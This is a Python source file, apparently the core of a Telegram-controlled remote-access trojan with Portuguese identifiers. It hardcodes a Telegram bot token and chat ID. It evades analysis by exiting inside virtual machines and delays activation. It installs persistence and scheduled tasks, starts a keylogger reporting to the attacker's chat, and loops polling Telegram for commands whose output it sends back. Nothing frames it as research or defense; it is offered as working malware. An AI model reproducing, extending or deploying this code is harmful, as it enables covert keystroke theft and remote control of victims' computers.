import requests, time, threading, socket
from core import persistencia, evasao_antivm, keylogger, comandos, condicional

BOT_TOKEN = '7504792598:AAHN9Cy96poY_6JCKqXTBMUlx08vn8lZPNg'
CHAT_ID = '7314010265'
BOT_ID = socket.gethostname()

def send(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': msg})
    except: pass

def main():
    if evasao_antivm.esta_em_vm(): return
    if not condicional.ativar_apenas_apos("08"): return
    persistencia.registrar()
    persistencia.agendar()
    keylogger.iniciar_keylogger(BOT_TOKEN, CHAT_ID)
    send(f"🤖 BOT {BOT_ID} ativo")
    ultimo = None
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={'offset': ultimo, 'timeout': 30}).json()
            for update in r.get("result", []):
                ultimo = update["update_id"] + 1
                texto = update["message"]["text"]
                out = comandos.tratar(texto, BOT_TOKEN, CHAT_ID)
                send(f"{BOT_ID} > {out}")
        except: pass
        time.sleep(3)

if __name__ == "__main__":
    main()